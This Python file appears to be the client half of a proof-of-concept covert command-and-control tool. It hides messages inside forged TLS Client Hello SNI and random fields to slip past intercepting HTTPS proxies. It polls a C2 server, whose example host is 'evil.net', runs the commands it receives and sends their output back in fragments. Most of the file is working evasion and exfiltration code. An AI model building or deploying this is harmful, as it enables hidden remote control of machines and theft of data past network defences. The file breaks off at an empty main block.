# -*- coding: utf-8 -*-

# TODO: for threading:
#   test if we can open a single TCP/HTTP conn and sending multiple Hellos
#   .. how will that work ^^ tho when when want to multiplex?
#   this this sh1t out.


"""
client.py

PoC To Smuggle Messages through an intercepting HTTPS proxy using only the TLS Handshake.

"""


"""
    PAYLOAD:

    Use *Client Hello Server Name Indication (SNI) Field* to smuggle Messages

    Format: {MESSAGE}.tld
        Where `.tld` is a random generated TLD of MAX LEN 4 chars (4 CHARS)

    NOTE: MAX LEN of an SNI FIELDS is 255 CHARS Which equals 127 Bytes
        Our random TLD consumes 5 of those CHARS (including the '.' char)
        Thus, MAX_MSG_LEN = ** 250 ** CHARS or ** 125 ** bytes
    
    NOTE: Messages being packed into the SNI are converted to ASCII HEX strings.
        Thus, a message before packing will result in a 2x message length after being packed.
        Hence the max limits of 125 chars (each char being 2 bytes in length)
        Ex. str('c').encode().hex() == '63' <-- Thats 2 Chars.

    Example: A raw message of "hello" which has a length of 5 chars will result in:
        >>> make_sni(b"hello" + _get_random_tld())
            '68656c6c6f.kshf'
        Which has a total length of 15 chars after hex encoding and appending a our random tld
            [ MSG_LEN*2 + MAX_TLD_LEN = TOTAL_MSG_LEN ]

"""

import argparse
import socket
import time
import struct
import typing
import random
import string
import math
import threading
import re
import sys

from protocol import *

MAX_SNI_LEN = 254  # MAX LEN of SNI field value in terms of BYTES
MAX_TLD_LEN = 4  # Our random TLD generator max char length
SNI_PADDING_LEN = 3  # To have an RFC Compliant hostname, nodes can be no longer than 63 chars
MAX_MSG_LEN = MAX_SNI_LEN - MAX_TLD_LEN - SNI_PADDING_LEN - 2  # == 245 bytes

POLL_INTERVAL = 10  # seconds for how often we send a heartbeat to the server
MAX_RETRIES = 5  # Max num of times we will retry sending a message before giving up
VERBOSE = False
CLIENT_MODE = "sni"
THREADS = 1
MAX_THREADS = 64


class Session:
    tls_client_hello = [  # idx  type     description
        b"\x16",  # [00] fixed    Record Type: TLS Handshake
        b"\x03\x01",  # [01] fixed    TLS REcord Version: v1.0
        b"\x00\x00",  # [02] variable Record Length: uint16
        b"\x01",  # [03] fixed    Handshake Type: Client Hello
        b"",  # [04] unused   -
        b"\x00\x00\x00",  # [05] variable Handshake Length: uint24
        b"\x03\x03",  # [06] fixed    Handshake Version: TLSv1.2
        b"\x00" * 4,  # [07] variable GMT Epoch                       4 Bytes   [SMUGGLE]
        b"\x00" * 28,  # [08] variable Random Seed                     28 Bytes  [SMUGGLE]
        b"\x00",  # [09] variable Session ID Length uint8
        b"",  # [10] variable Session ID 32 Bytes
        b"\x00\x00",  # [11] variable Cipher Suites List Len: uint16
        b"\x00",  # [12] variable Cipher Suites
        b"\x01",  # [13] fixed    Compression Methods List Len
        b"\x00",  # [14] fixed    Compression = null
        b"\x00\x00",  # [15] variable Extensions Length: uint16
        b"\x00",  # [16] variable Extension: SNI (object)         255 Bytes [SMUGGLE]
        b"\x00",  # [17] fixed    Extension: Elliptic Formats
        b"\x00",  # [18] fixed    Extension: Elliptic Groups
        b"\x00\x10",  # [19] variable Extension: Elliptic Alogorithms
        b"\x00\x00",  # [20] fixed    Extension: ALPN
        b"",  # [21] unused   -
    ]

    def __init__(self, server=None, proxy=None, test_mode=False, manual_connect=False):
        """
        Establishes a new C2 Session with the server specified.
        Returns an a C2Session instance.

        Pass in server= as an host:port str, Ex: "server=evil.net:443"
        Pass in proxy= as an URL str, Ex: "http://proxy.corp.net:8080/"

        1. First establishing a proxy CONNECT (if not direct)
        2. Assigned ourself a random client id string
        3. Attempt a CONNECT reqest with the C2 Server
        4. Set is_connect and result_msg accordingly
        5. Return our instance, reguardless of result
        """
        # init some variables
        self.proxy = ""
        self.server = ""
        self.mode = ""  # use SNI or random seed for smuggling, "sni" || "seed"
        self.mss = CLIENT_MAX_SNI_SIZE  # our mode detemines the Maximum Segement Size
        self.tcp_socket = None
        self.connect_function = None
        self.connect_args = []
        self.is_connected = False
        self.result_msg = ""
        self.is_heartbeat_active = False
        self.session_id = API.gen_session_id()
        self.heartbeat_thread = None
        self.heartbeats_missed = 0
        self.rtt_ms = 0  # round trip time to send and recv and ack for our message
        self.bytes_sent = 0
        self.client_id = b""
        self.last_poll_time = 0
        self.message_list = []
        self._is_sending = False
        self._is_tcp_connected = False
        self._thread_slots_available = MAX_THREADS
        self._thread_fragments_sent = 0
        init_result = self._connect_init(server, proxy)
        if manual_connect:
            return
        payload = b"_C2CRET_"
        if not init_result:
            return
        if CLIENT_MODE != "sni":
            payload = b"_FALSE_"
        if test_mode:
            # override mode if provided manually
            print(f"TEST MODE: Sending '{payload}' as our payload... ")
            self._set_tls_client_hello(ClientMessage().test(), self._make_sni(payload))
        else:
            #
            # Send CONNECT to server to establish protocol level communication
            #
            # set our connect message
            self._set_tls_client_hello(ClientMessage().connect(), self._make_sni(payload))
        # send it!!
        response = self._send_message()
        if not response:
            return
        # Check server response bytes; First extract our protocol msg in the SAN record
        proto_header, san_payload = self._parse_server_hello(response)
        # print("DEBUG")
        # print(san_payload)
        # print("DEBUG")
        # Now parse our header
        # The Server tells us what our client ID will be
        valid_san = False
        use_sni = False
        if (
            Message().get_msg_type(proto_header) == ServerMessage.TEST
            or Message().get_msg_type(proto_header) == ServerMessage.ACK
        ):
            print(f"Raw Protocol Header: {proto_header}")
            print(f"Decoded SAN Payload: {san_payload}")
            print()
            msg = san_payload.decode().split(",")
            if msg[0] == "_C2CRET_":
                valid_san = True
                print("[+] Valid SAN payload recieved from the Server!")
            else:
                print("[!] Invalid SAN message from server :(")
            if msg[1] == "True":
                print("[+] Random Seed Smuggling PASSED!")
            else:
                print("[!] Random Seed Smuggling failed :(")
            if msg[2] == "True":
                use_sni = True
                print("[+] SNI Smuggling PASSED!")
            else:
                self.mss = CLIENT_MAX_SEED_SIZE
                print("[!] SNI smnuggling failed :(")
            print()
        else:
            self.result_msg = f"Did not recieve an ACK message in response to our CONNECT request: Got '{Message().get_msg_type(proto_header).hex()}' instead"
        if Message().get_msg_type(proto_header) == ServerMessage.TEST:
            return
        if Message().get_msg_type(proto_header) == ServerMessage.ACK and valid_san:
            self.is_connected = True
            self.client_id = Message().get_client_id(proto_header)
            self.last_poll_time = int(time.time())
            # We should now have an established connection to our C2 Server now!
            self.result_msg = "OK"
            if use_sni:
                self.mode = "sni"
            else:
                self.mode = "seed"
            # Start up our Heatbeat in a seperate thread
            self.heartbeat_thread = threading.Thread(target=self._poll, daemon=True)
            self.is_heartbeat_active = True
            self.heartbeat_thread.start()

    # end __init__()

    def _connect_init(self, server: str, proxy: str) -> bool:
        if not server:
            self.result_msg = "No C2 Server was specified"
            return False
        if not proxy:
            self.connect_func = self._connect_direct
            self.connect_args = [server]
        else:
            self.connect_func = self._connect_proxy
            self.connect_args = [proxy, server]
        self.proxy = proxy
        self.server = server
        return True

    def _connect_wrapper(self) -> bool:
        """All this does is abstract our which connection method to use, direct or via proxy"""
        prox_start_time_ns = int(time.time_ns())
        connect_result = self.connect_func(*self.connect_args)
        self.rtt_ms = int((int(time.time_ns()) - prox_start_time_ns) / NS_TO_MS)
        if not connect_result or type(self.tcp_socket) != socket.socket:
            self.result_msg = "Failed to establish TCP connection to C2 Server!"
            return False
        return True

    def _poll(self) -> None:
        """Periodically sends heartbeat or poll messages to the C2 server"""
        while True:
            time.sleep(POLL_INTERVAL)
            if self.is_heartbeat_active:
                self._set_tls_client_hello(ClientMessage().heartbeat(self.client_id), self._get_random_sni())
                response = self._send_message()
                proto_header, san_payload = self._parse_server_hello(response)
                msg_type = Message().get_msg_type(proto_header)
                if msg_type != ServerMessage.ACK and msg_type != ServerMessage.CMD_AVAILABLE:
                    self.heartbeats_missed += 1
                    self.result_msg = f"Missed {self.heartbeats_missed} heartbeat messages"
                else:
                    self.result_msg = "OK"
                    self.heartbeats_missed = 0
                    self.last_poll_time = int(time.time())
                    self.is_connected = True
                if self.heartbeats_missed > 4:
                    self.heartbeats_missed = 0
                    self.is_connected = False
                # Check if the server wants us to do anything
                if msg_type == ServerMessage.CMD_AVAILABLE:
                    # grab whatever is in the SNI and send it to the API
                    msg_text = ""
                    try:
                        msg_text = san_payload.decode()
                    except:
                        msg_text = san_payload.hex()
                    if VERBOSE:
                        print()
                        print(f" > Got cmd_available: {msg_text}")
                    api_result = API().client_handle(msg_text)
                    if THREADS > 1:
                        self.async_send(api_result, THREADS)
                    else:
                        self.send(api_result)
                    self.message_list.append(
                        f"RECV < [[ {len(san_payload)} bytes; msg_type={msg_type.hex()}; request= ` {msg_text[:50]} ` ]]"
                    )

    def async_send(self, message: bytes, threads: int) -> bool:
        """Works just like send() but sends fragements asynchronously"""
        if not self.is_connected:
            return False
        self.is_heartbeat_active = False  # pause our polling thread until we are done sending our msg
        start_time_ms = int(int(time.time_ns()) / NS_TO_MS)
        self.bytes_sent = 0
        max_msg_len = self.mss
        if len(message.hex()) > len(message) and self.mode == "sni":
            max_msg_len = int(self.mss / 2)
        chunks = [message[i : i + max_msg_len] for i in range(0, len(message), max_msg_len)]
        if VERBOSE:
            print(f"[+] Attempting to send {len(message)} bytes in {len(chunks)} fragments using {THREADS} threads...")
        smuggle = Message()
        # First chunk our message up into fragments
        fragments = []
        for k, v in enumerate(chunks):
            smuggle.header = self.client_id + ClientMessage.FRAGMENT
            smuggle.body = (
                struct.pack(">L", len(chunks)) + struct.pack(">L", k) + struct.pack(">L", smuggle.compute_crc(v))
            )
            sni = self._make_sni(v)
            if self.mode == "sni":
                self._set_tls_client_hello(smuggle.to_bytes(), sni)
            else:
                smuggle.set_payload(v)
                sni = self._get_random_sni()
                self._set_tls_client_hello(smuggle.to_bytes(), sni)
            if VERBOSE:
                print(f"> HEADERS: {smuggle.to_bytes().hex()}")
                print(f"> SNI: {sni[9:].decode()}")
            fragments.append(b"".join(self.tls_client_hello))

        # TODO: We have our fragments now, send them asyncronously
        threads = []
        thread_results = []
        thread_results_bool = []
        bytes_sent = 0
        self._thread_slots_available = 0
        self._thread_fragments_sent = 0
        self._thread_slots_available = THREADS
        threads_started = 0
        self._is_sending = True
        for idx, fragment in enumerate(fragments):
            while True:
                # print(
                #     f"!!      DEBUG 1: len(fragments)={len(fragments)}, current_fragment_idx={idx}, available_slots={self._thread_slots_available}, threads_started={threads_started}"
                # )
                if self._thread_slots_available > 0:
                    thread_results.insert(idx, b"_EMPTY_")
                    thread_results_bool.insert(idx, False)
                    thread = threading.Thread(
                        target=self._async_send, args=(fragment, thread_results, idx, thread_results_bool)
                    )
                    thread.start()
                    threads_started += 1
                    bytes_sent += len(fragment)
                    sys.stdout.write("\033[K")
                    print(f"    Sending {bytes_sent} bytes...", end="\r")
                    sys.stdout.flush()
                    break
                else:
                    time.sleep(1)

        if VERBOSE:
            print(f"[+] Submitted {bytes_sent} bytes to {threads_started} fragments in ({THREADS} concurrent threads)")
        # Now check our results and Wait for threads to complete...
        while self._thread_fragments_sent < threads_started:
            time.sleep(1)
        for idx, thread_result in enumerate(thread_results_bool):
            if not thread_result:
                print(f"[!] Error Sending Fragment {idx}, Got {thread_results[idx]}")

        # Now send our Final response msg, telling the server we are done sending
        smuggle.header = self.client_id + ClientMessage.RESPONSE
        smuggle.body = struct.pack(">L", len(chunks)) + struct.pack(">L", 0) + struct.pack(">L", 0)
        self._set_tls_client_hello(smuggle.to_bytes(), self._get_random_sni())
        response = self._send_message()
        proto_header, san_payload = self._parse_server_hello(response)
        msg_type = Message().get_msg_type(proto_header)
        if msg_type != ServerMessage.ACK:
            self.result_msg = "Server responded with an unexpected message while sending a response msg: " + str(
                msg_type
            )
            return False
        total_time_ms = int(int(time.time_ns() / NS_TO_MS) - start_time_ms)
        self.bytes_sent = len(message)
        msg_text = ""
        try:
            msg_text = message.decode().replace("\n", "\\n")
        except:
            msg_text = message.hex()
        ellipse = ""
        if len(msg_text) > 65:
            ellipse = "...[truncated]"
        if VERBOSE:
            print(
                f"[+] Send Success! Original Message Size {len(message)} bytes. Fragments: {len(chunks)}. Threads: {len(threads)}. Total Bytes Sent: {bytes_sent}. RTT: {total_time_ms}ms. BPS: {round( (len(message)/(total_time_ms/1000)) ,2)}"
            )
        self.message_list.append(
            f"SEND > [[ {self.bytes_sent} bytes; rtt={self.rtt}ms; msg_type={smuggle.get_msg_type(proto_header).hex()}; response= ` {msg_text[:65]+ellipse} ` ]]"
        )
        self._is_sending = False
        self.is_heartbeat_active = True
        return True

    def send(self, message: bytes) -> bool:
        """This is our abstracted sender method
        It takes bytes, stuffs it into the SNI in the correct format
        Chucks as needed, does CRC magic and all that.

        It only send RESPONSE or FRAGMENT type messages. For example;
            The server asks for a directly listing `ls`
            We would call Session.send(cmd_output.encode())
            This fuction handles eveything else.

        Return bool if message was sent successful or not.
        """
        if not self.is_connected:
            return False
        self.is_heartbeat_active = False  # pause our polling thread until we are done sending our msg
        total_rtt = 0
        # TODO: This function takes a bytes object, which means if `message` is LARGE.. that lives in memory for a time
        # TODO: Need to code up a sender that will stream chunks, and thus consume far less memory. (complicated)
        #
        # NOTE: Here is the tricky part. If we are sending just raw bytes, hex cnoding will result in the Same Size message
        # NOTE: In other words, hex encoding has no penelty on our MAX_MSG_LEN
        # NOTE: HOWEVER, sending strings, hex encoding DOUBLEs the char len of the string
        # NOTE: Ex. A single char 'c', >>> str('c').encode().hex() == '63' <- that's two chars :(
        # NOTE: This all means.. our SNI smuggled payload is HALVED. This is the cost of doing business.
        # test out what hex encoding will do to us:
        max_msg_len = self.mss
        if len(message.hex()) > len(message) and self.mode == "sni":
            max_msg_len = int(self.mss / 2)
        chunks = [message[i : i + max_msg_len] for i in range(0, len(message), max_msg_len)]

        # TODO: MAKE THIS SEND WITH THREADS!!!
        # TODO: we'll want to blast chunks, then send a RESPONSE msg type when done
        # // threading this will... be interesting to say the least
        start_time_ms = int(int(time.time_ns()) / NS_TO_MS)
        chunks_last_index = len(chunks) - 1
        smuggle = Message()
        for k, v in enumerate(chunks):
            smuggle.header = self.client_id + ClientMessage.FRAGMENT
            smuggle.body = (
                struct.pack(">L", len(chunks)) + struct.pack(">L", k) + struct.pack(">L", smuggle.compute_crc(v))
            )
            # TODO: this is where we will send payload in our smuggle object instead of SNI !!!
            # smuggle.body = smuggle.body + self.session_id
            # print("DEBUG")
            # print(f"DEBUG_fragment_len:{len(v)}")
            # print(f"DEBUG_fragment_index:{k}")
            # print(f"DEBUG_header:{smuggle.header.hex()}")
            # print("DEBUG")
            sni = self._make_sni(v)
            if self.mode == "sni":
                self._set_tls_client_hello(smuggle.to_bytes(), sni)
            else:
                smuggle.set_payload(v)
                sni = self._get_random_sni()
                self._set_tls_client_hello(smuggle.to_bytes(), sni)
            if VERBOSE:
                print(f"> HEADERS: {smuggle.to_bytes().hex()}")
                print(f"> SNI: {sni[9:].decode()}")
            for i in range(MAX_RETRIES):
                if i == MAX_RETRIES - 1:
                    self.result_msg = "Failed to resend message - Max retries reached"
                    return False
                response = self._send_message()
                proto_header, san_payload = self._parse_server_hello(response)
                msg_type = Message().get_msg_type(proto_header)
                if msg_type == ServerMessage.CRC_ERROR:
                    continue
                if msg_type != ServerMessage.ACK:
                    self.result_msg = "Server responded with an unexpected message while sending a fragment: " + str(
                        msg_type
                    )
                    return False
                break
            # end for(retries)
            total_rtt = total_rtt + self.rtt
        # end for(chunks)
        # Now send our Final response msg, telling the server we are done sending
        smuggle.header = self.client_id + ClientMessage.RESPONSE
        smuggle.body = struct.pack(">L", len(chunks)) + struct.pack(">L", 0) + struct.pack(">L", 0)
        self._set_tls_client_hello(smuggle.to_bytes(), self._get_random_sni())
        response = self._send_message()
        proto_header, san_payload = self._parse_server_hello(response)
        msg_type = Message().get_msg_type(proto_header)
        if msg_type != ServerMessage.ACK:
            self.result_msg = "Server responded with an unexpected message while sending a response msg: " + str(
                msg_type
            )
            return False
        self.rtt = int(int(time.time_ns()) / NS_TO_MS) - start_time_ms
        self.bytes_sent = len(message)
        msg_text = ""
        try:
            msg_text = message.decode().replace("\n", "\\n")
        except:
            msg_text = message.hex()
        ellipse = ""
        if len(msg_text) > 65:
            ellipse = "...[truncated]"
        self.message_list.append(
            f"SEND > [[ {self.bytes_sent} bytes; rtt={self.rtt}s; msg_type={smuggle.get_msg_type(proto_header).hex()}; response= ` {msg_text[:65]+ellipse} ` ]]"
        )
        self.is_heartbeat_active = True
        return True

    def _set_tls_client_hello(self, header: bytes, body: bytes) -> None:
        # NOTE: MAX_SNI_LEN + 9 because 9 bytes are used for SNI fields headers, not msg.
        if len(body) > (MAX_SNI_LEN + 9):
            print(f"ERROR: Encoded message length of {len(body)} exceeds MAX_LEN of {MAX_SNI_LEN}")
            raise NotImplementedError
        self.tls_client_hello[20] = self._get_alpn()
        self.tls_client_hello[19] = self._get_ec_algorithms()
        self.tls_client_hello[18] = self._get_ec_groups()
        self.tls_client_hello[17] = self._get_ec_formats()
        self.tls_client_hello[16] = body
        # self.tls_client_hello[16] = self._fixed_sni()
        # TODO: We may have Endianess issues here on other platforms...
        #   This because struct pulls its long, int etc from compiled C types where byte order matters
        self.tls_client_hello[15] = struct.pack(">H", len(b"".join(self.tls_client_hello[16:])))
        self.tls_client_hello[12] = self._get_cipher_suites()
        self.tls_client_hello[11] = struct.pack(">H", len(self.tls_client_hello[12]))
        # TODO: in the future, we will use seed field to smuggle payloads
        self.tls_client_hello[8] = header[4:]
        self.tls_client_hello[7] = header[:4]
        self.tls_client_hello[5] = struct.pack(">L", len(b"".join(self.tls_client_hello[6:])))[1:]
        self.tls_client_hello[2] = struct.pack(">H", len(b"".join(self.tls_client_hello[3:])))

    # TODO: IS this func even being used ???
    def _encode_tls_payload(self, message: str) -> typing.Tuple[bytes, bytes]:
        """
        Takes a string message and returns a Tuple of bytes cooresponding to SNI and random field in the TLS record
        """
        hex_msg = self._str_to_hex(message)
        # need to ensure that each 'label' contains max 63 chars
        # sliced = [hex_msg[x : x + 63] for x in range(0, len(hex_msg), 63)]
        # hex_msg = ".".join(sliced)
        sni_tld = self._get_random_tld()
        # TODO: make this more robust - Use random seed field for smuggling
        return (self._make_sni(hex_msg + sni_tld), self._get_random_seed())

    def _get_random_sni(self) -> bytes:
        host = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(4, 24)))
        return self._make_sni(host.encode())

    def _get_random_tld(self):
        return "." + "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(2, MAX_TLD_LEN)))

    def _get_random_seed(self) -> bytes:
        return bytes([random.randrange(0, 256) for _ in range(0, 32)])

    def _str_to_hex(self, message: str) -> str:
        return bytes.hex(message.encode())

    def _hex_to_str(self, message: str) -> str:
        return bytes.fromhex(message.decode()).decode()

    def _to_byte_stream(self) -> bytes:
        return b"".join(self.tls_client_hello)

    def __str__(self):
        return str("".join(self._escape(b) for b in self.tls_client_hello))

    def _escape(self, byte_arr: bytes) -> str:
        return "".join("\\x{:02x}".format(b) for b in byte_arr)

    def _print_lens(self):
        l = 0
        for i, r in enumerate(self.tls_client_hello):
            l += len(r)
            print(f"len(record[{i}])={len(r)}")
        print(f"Total Length: {l}")

    def _get_cipher_suites(self) -> bytes:
        return b"\xc0\x30\xc0\x2c\xc0\x2f\xc0\x2b\x00\x9f\x00\x9e\xc0\x28\xc0\x24\xc0\x14\xc0\x0a\xc0\x27\xc0\x23\xc0\x13\xc0\x09\x00\x9d\x00\x9c\x00\x3d\x00\x35\x00\x3c\x00\x2f\x00\xff"

    def _get_ec_algorithms(self) -> bytes:
        return (
            b"\x00\x0d\x00\x16\x00\x14\x06\x01\x06\x03\x05\x01\x05\x03\x04\x01\x04\x03\x03\x01\x03\x03\x02\x01\x02\x03"
        )

    def _get_ec_groups(self) -> bytes:
        return b"\x00\x0a\x00\x08\x00\x06\x00\x1d\x00\x17\x00\x18"

    def _get_ec_formats(self) -> bytes:
        return b"\x00\x0b\x00\x02\x01\x00"

    def _get_alpn(self) -> bytes:
        return b"\x00\x10\x00\x0b\x00\x09\x08http/1.1"

    def _make_sni(self, message: bytes) -> bytes:
        hex_str = message.hex()
        # Per RFC, a hostname cannot be longer than 63 chars. So seperate with '.' as needed
        hex_str = ".".join(hex_str[i : i + 63] for i in range(0, len(hex_str), 63))
        hex_str = hex_str + self._get_random_tld()
        str_len = len(hex_str)
        hostname_len = struct.pack(">H", str_len)
        list_len = struct.pack(">H", str_len + 3)
        ext_len = struct.pack(">H", str_len + 5)
        return b"\x00\x00" + ext_len + list_len + b"\x00" + hostname_len + hex_str.encode()

    def _connect_proxy(self, proxy: str, server: str) -> bool:
        """Attempts to establish an HTTP session with the Proxy
        Sets self.tcp_socket with the socket object and Returns the bool result
        """
        proxy_host = proxy.split(":")[0]
        proxy_port = int(proxy.split(":")[1])
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if not self.is_connected:
            print(f"[+] Connecting to proxy: {proxy_host} ...")
        try:
            sock.connect((proxy_host, proxy_port))
        except Exception as e:
            self.result_msg = str(e)
            return False
        port = 443
        try:
            port = server.split(":")[1]
            server = server.split(":")[0]
        except:
            pass
        c_str = "CONNECT " + server + ":" + str(port) + " HTTP/1.1\r\n\r\n"
        if not self.is_connected:
            print(f" > {c_str.rstrip()}")
        sock.sendall(c_str.encode())
        resp = sock.recv(1024)
        resp_first_line = resp.decode().split("\r\n")[0]
        if not self.is_connected:
            print(" < " + resp_first_line)
        # we expect and HTTP/200 for our CONNECT request
        if int(resp.decode().split("\r\n")[0].split(" ")[1]) != 200:
            sock.close()
            print(f"Error: The proxy did not accept our connect request; Got '{resp_first_line}'")
            return False
        self.tcp_socket = sock
        self._is_tcp_connected = True
        return True

    def _connect_direct(self, server: str) -> bool:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if not self.is_connected:
            print(f"[+] Connecting DIRECT: {server} ...")
        port = 443
        try:
            port = server.split(":")[1]
            server = server.split(":")[0]
        except Exception as e:
            self.result_msg = str(e)
            return False
        try:
            sock.connect((server, int(port)))
        except Exception as e:
            self.result_msg = str(e)
            return False
        if type(sock) != socket.socket:
            self.result_msg = "Could not socket connect to server in: _connect_direct()"
            return False
        self.tcp_socket = sock
        self._is_tcp_connected = True
        return True

    def _send_message(self) -> bytes:
        """
        Sends a msg to the C2 server, the message in this case was set in `self.tls_client_hello`
        Remember that our overall TCP/TLS connection is STATELESS
        We are wrapping this stateless protocol in our own stateful one.
        Therefore, every single REQUEST/RESPONSE is stateless to the outside protocol
        """
        start = int(time.time_ns())
        if not self._connect_wrapper():
            return b""
        self.tcp_socket.sendall(b"".join(self.tls_client_hello))
        response_data = b""
        response_data = self.tcp_socket.recv(16384)
        # So ya, we teardown the TCP socket after every REQ/RESP
        self.tcp_socket.close()
        self.rtt = int((int(time.time_ns()) - start) / NS_TO_MS)
        return response_data

    def _async_send(self, fragment, results, result_index, thread_results_bool) -> None:
        """
        Sends a msg to the C2 server ASYNCH
        Remember that our overall TCP/TLS connection is STATELESS
        We are wrapping this stateless protocol in our own stateful one.
        Therefore, every single REQUEST/RESPONSE is stateless to the outside protocol
        """
        thread_results_bool[result_index] = False
        self._thread_slots_available -= 1
        response_bytes = b"_SEND_FAILURE_IDX=" + str(result_index).encode()
        results.insert(result_index, response_bytes)

        def _submit_error(msg: str):
            s = f"[!] _async_send() failed on thread {result_index} with {msg}"
            results.insert(result_index, s.encode())
            self._thread_slots_available += 1
            self._thread_fragments_sent += 1
            return

        # WE NEED TO DO EVERYTHING OURSELVES IN HERE. BE ATOMIC WITH IT N SH1T

        # return True
        sock = None
        is_connected = False
        if self.proxy:
            """Attempts to establish an HTTP session with the Proxy
            Sets self.tcp_socket with the socket object and Returns the bool result
            """
            proxy_host = self.proxy.split(":")[0]
            proxy_port = int(self.proxy.split(":")[1])
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                sock.connect((proxy_host, proxy_port))
            except Exception as e:
                return _submit_error(str(e))
            port = 443
            server = self.server
            try:
                port = self.server.split(":")[1]
                server = self.server.split(":")[0]
            except:
                pass
            c_str = "CONNECT " + server + ":" + str(port) + " HTTP/1.1\r\n\r\n"
            sock.sendall(c_str.encode())
            response = sock.recv(1024)
            resp_first_line = response.decode().split("\r\n")[0]
            if not self.is_connected:
                print(" < " + resp_first_line)
            # we expect and HTTP/200 for our CONNECT request
            if int(response.decode().split("\r\n")[0].split(" ")[1]) != 200:
                sock.close()
                return _submit_error(f"Error: The proxy did not accept our connect request; Got '{resp_first_line}'")
            is_connected = True
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            port = 443
            try:
                port = self.server.split(":")[1]
            except:
                pass
            server = self.server.split(":")[0]

            try:
                sock.connect((server, int(port)))
            except Exception as e:
                return _submit_error(str(e))

            if type(sock) != socket.socket:
                return _submit_error("Could not socket connect to server in: _connect_direct()")

            is_connected = True
        if is_connected:
            sock.sendall(fragment)
            response_bytes = sock.recv(16384)
            results.insert(result_index, response_bytes)
            sock.close()
        else:
            return _submit_error("NOT CONNECTED!")
        self._thread_slots_available += 1
        self._thread_fragments_sent += 1
        thread_results_bool[result_index] = True
        return

    def _parse_server_hello(self, response_bytes: bytes) -> bytes:
        """Extracts SAN message from response bytes;
        Returns TUPLE of bytes: Our protocol header, and any message that may be present"""
        hex_str = response_bytes.hex()
        hex_array = [hex_str[i : i + 2] for i in range(0, len(hex_str), 2)]
        position = self._validate_handshake_msg(hex_str, hex_array)
        if position < 1:
            print(f"[!] Failed to parse Response - Not a valid TLS Hanshake message!")
            return ""
        san_records_hex = self._find_san_records(self._extract_certs(hex_array, position))
        message = b""
        for hex_record in san_records_hex:
            message = message + bytes.fromhex("".join(bytes.fromhex(hex_record).decode().split(".")[:-2]))
        protocol_header = bytes.fromhex(message[:64].decode())
        # print("DEBUG")
        # print(message[64:])
        # print("/DEBUG")
        san_message = message[64:]
        return (protocol_header, san_message)

    def _get_protocol_header(self, response_bytes: bytes) -> bytes:
        """Extracts random seed field (our protocol headers) from a TLS Server Hello"""
        # NOTE: It exstracts this from the SAN Field
        hex_str = response_bytes.hex()
        is_valid_handshake = True
        handshake_len = 0
        if hex_str[0:2] != "16":
            is_valid_handshake = False
        if hex_str[2:4] != "03":
            is_valid_handshake = False
        if (int(hex_str[4:6], 16) < 1) or (int(hex_str[4:6], 16) > 4):
            is_valid_handshake = False
        max_len = int(math.pow(2, 15))
        handshake_len = int(hex_str[6:10], 16)
        if (handshake_len < 1) or (handshake_len > max_len):
            is_valid_handshake = False
        if hex_str[10:12] != "02":
            is_valid_handshake = False
        # hex_str[12:18] is the handshake len
        # hex_str[18:20] is the tls handshake version
        if not is_valid_handshake:
            return b""
        return bytes.fromhex(hex_str[22 : 22 + (32 * 2)])

    def _validate_handshake_msg(self, hex_str: str, hex_array: list) -> int:
        is_valid_handshake = True
        position = 0
        # For each TLS record
        # print(hex_str)
        # try:
        current_obj_len = 0
        handshake_len = 0
        if hex_str[0:2] != "16":
            is_valid_handshake = False
        if hex_str[2:4] != "03":
            is_valid_handshake = False
        if (int(hex_str[4:6], 16) < 1) or (int(hex_str[4:6], 16) > 4):
            is_valid_handshake = False
        max_len = int(math.pow(2, 15))
        handshake_len = int(hex_str[6:10], 16)
        if (handshake_len < 1) or (handshake_len > max_len):
            is_valid_handshake = False
        if hex_str[10:12] != "0b":
            # If not a Certificate type message
            # is_valid_handshake = False
            current_obj_len = int(hex_str[12:18], 16)
            if (current_obj_len < 1) or (current_obj_len > max_len):
                is_valid_handshake = False
            # assume nested record
            position = 1 + 2 + 2 + current_obj_len + 3 + 1
            if hex_array[position] != "0b":
                # it's possible this is an un-nested tls recoard layer
                if "".join(hex_array[position : position + 3]) == "160303":
                    return self._validate_handshake_msg("".join(hex_array[position:]), hex_array[position:])
            else:
                position = position + 1
                current_obj_len = int("".join(hex_array[position : position + 3]), 16)
                position = position + 3
                certs_len = int("".join(hex_array[position : position + 3]), 16)
        else:
            current_obj_len = int(hex_str[12:18], 16)
            position = position + 1
            current_obj_len = int("".join(hex_array[position : position + 3]), 16)
            position = position + 3
            certs_len = int("".join(hex_array[position : position + 3]), 16)
        if certs_len < 32:
            is_valid_handshake = False
        # except:
        # is_valid_handshake = False
        if not is_valid_handshake:
            return -1
        return position

    def _extract_certs(self, hex_array: list, position: int) -> list:
        cert_hex_arrays = []
        certs_len = int("".join(hex_array[position : position + 3]), 16)
        position = position + 3
        certs_handshake_position = 0
        while certs_handshake_position < certs_len:
            try:
                cert_len = int("".join(hex_array[position : position + 3]), 16)
            except:
                break
            position = position + 3
            cert_hex_arrays.append(hex_array[position : position + cert_len])
            position = position + cert_len
            certs_handshake_position = certs_handshake_position + 3 + cert_len
        return cert_hex_arrays

    def _find_san_records(self, cert_list: list) -> list:
        #    len          ext_type          len       len       len
        # 30 37   06 03   [ 55 1d 11 ] 04   30    30  2e    82  1d [_SAN_] 82 06 [_SAN_] 82 05 [_SAN_] 30  ...
        # NOTE: Admittedly, this is a bit of a hack. We are manually parsing x509 certs. Which.. ya :(
        # NOTE: But I want to keep this code as lib-independant as possible. So, this is us, on the raggedy edge :/
        san_records = []
        for cert in cert_list:
            if san_records:
                break
            hex_str = "".join(cert)
            # Re-write this to be more simple, less error prone
            expression = "0603551d1104[0-9a-f]{3,8}([0-9a-f]{2})82"
            field_len = int(re.search(expression, hex_str).groups()[0], 16)
            expression = "0603551d1104[0-9a-f]{3,8}([0-9a-f]{2})82([0-9a-f]{" + str(field_len * 2) + "})"
            san_record = re.search(expression, hex_str).groups()[1]
            # trim headers, tailers
            san_record = san_record[2:]
            san_record = san_record[:-2]
            # this is a hack because I cant figure out how this is constructed :/
            # strip non-ascii chars
            if ord(san_record[0]) < 128:
                san_record = san_record[2:]
            san_records.append(san_record)
            # print(bytes.fromhex(hex_record).decode())
            # print("/DEBUG")
        return san_records


# end class Session()

if __name__ == "__main__":
